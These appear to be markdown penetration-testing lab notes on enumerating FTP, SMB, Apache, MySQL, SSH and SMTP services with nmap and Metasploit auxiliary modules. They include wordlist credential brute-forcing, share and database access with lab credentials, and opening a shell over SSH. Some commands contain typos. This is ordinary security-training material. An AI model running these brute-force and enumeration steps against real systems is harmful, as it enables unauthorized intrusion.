# Enumeration

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 5543–5792. Examples are lab-specific and need verification.

- FTP

    File Transfer Protocol -21

    >**nmap —script=fpt-* -p 21 ip**    //comprehensive scan on FTP

    `nmap -sV 10.10.10.10`

    `service postgresql start && msfconsole`

    `workspace -a FTP_ENUM`

    `workspace`

    1. `use auxiliary/scanner/portscan/tcp`
    2. `search type:auxiliary name: ftp`
    3. `use auxiliary/scanner/ftp/ftp_login`

        `set RHOSTS 10.10.10.10`

        `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

        `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

        `run`

    4. `use auxiliary/scanner/ftp/ftp_version`
    5. `use auxiliary/scanner/ftp/anonymous`
    6. run
    7. ftp ip

    //or another login system:

    1. ~#ftp target_ip
    2. name: sysadmin
    3. password:
    4. ftp>ls
    5. get secret.txt
    6. exit
    7. ls
    8. cat secret.txt

- SMB

    Server Message Block - 139(NetBIOS),445(TCP)

    SAMBA is the linux implementation of SMB

    ifconfig eth1 .2—>3 target ip

    `service postgresql start && msfconsole`

    `workspace -a SMP_ENUM`

    1. `setg RHOSTS 10.10.10.10`
    2. search type:auxiliary name:smb
    3. `use auxiliary/scanner/portscan/tcp`
    4. `use auxiliary/scanner/smb/smb_version`
    5. `use auxiliary/scanner/smb/smb_enumusers`
    6. info
    7. run
    8. `use auxiliary/scanner/smb/smb_enumshares`
    9. set showfiles true
    10. run
    11. `use auxiliary/scanner/smb/smb_login`

        `set SMBUser admin`

        `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

        `run`

        exit

        #

    12. `smbclient -L \\\\10.10.10.10\\ -U admin`
    13. `smbclient \\\\10.10.10.10\\public -U admin`
    14. ls
    15. cd secret
    16. get flag
    17. exit
    18. cat flag

- Web Server (Apache)

    Popular web servers: Apache, Nginx and Mircrosoft IIS

    Apache - port 80,443

    ifconfig 2 —>3 for eth1

    1. `service postgresql start && msfconsole`
    2. `workspace -a Web_Enum`
    3. `setg RHOSTS 10.10.10.10`
    4. `setg RHOST 10.10.10.10`
    5. search type:auxiliary name:http
    6. `use auxiliary/scanner/http/http_version`
    7. search http_header
    8. `use auxiliary/scanner/http/http_header`
    9. run
    10. search robots_txt
    11. `use auxiliary/scanner/http/robots_txt`
    12. user-agent: disallow: /data and /secure
    13. curl http://ip/secure/
    14. `use auxiliary/scanner/http/dir_scanner`
    15. run
    16. analysis diff dir
    17. `use auxiliary/scanner/http/files_dir`
    18. `use auxiliary/scanner/http/apache_userdir_enum`

        `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

    19. `use auxiliary/scanner/http/http_login`

        `set AUTH_URI /secure`

        `unset USERPASS_FILE`

        `set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt`

        `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

        `set VERBOSE false`

        `run`

        set USER_FILE and set PASS_FILE change msf pass

        search apache_userdir_enum

        run

        echo “rooty” > user.txt

- MySQL

    MySQL - 3306

    1. `service postgresql start && msfconsole`
    2. `workspace -a SQL_ENUM`
    3. `setg RHOSTS 10.10.10.10`
    4. `use auxiliary/scanner/mysql/mysql_version`
    5. `use auxiliary/scanner/mysql/mysql_login`

        `set USERNAME root`

        `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

        `set VERBOSE false`

        `run root:twinkle`

    6. `use auxiliary/admin/mysql/mysql_enum`

        `set USERNAME root`

        `set PASSWORD twinkle`

        `run`

    7. `use auxiliary/admin/mysql/mysql_sql`

        `set USERNAME root`

        `set PASSWORD twinkle`

        `set SQL show databases;`

        `run`

        set SQL use videos;

        run

    8. `use auxiliary/scanner/mysql/mysql_schema`

        `set username and password`

        run

        hosts

        services

        loot

        creds

        exit

        //#

    9. `mysql -h 10.10.10.10 -u root -p twinkle`
    10. MySQL>show databases;
    11. use vides;
    12. show tables;
    13. exit

- SSH

    Secure Shell - 22

    1. `service postgresql start && msfconsole`
    2. `workspace -a ssh_enum`
    3. `setg rhosts 10.10.10.10`
    4. `use auxiliary/scanner/ssh/ssh_version`
    5. `use auxiliary/scanner/ssh/ssh_login`

        `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

        `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`

        run

        sessions

        sessions 1

        ..>ls

        /bin/bash -i

        whoami

        exit

        `run sysadmin:hailey`

    6. `use auxiliary/scanner/ssh/ssh_enumusers`

        `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

- SMTP

    Simple Mail Transfer Protocol - 25,465, 587

    ifconfig

    1. `service postgresql start && msfconsole`
    2. `workspace -a smtp_enum`
    3. `setg rhosts 10.10.10.10`
    4. search type:auxiliary name: smtp
    5. `use auxiliary/scanner/smtp/smtp_version`
    6. `use auxiliary/scanner/smtp/smtp_enum`
    7. info         //more knowledge about this
    8. run
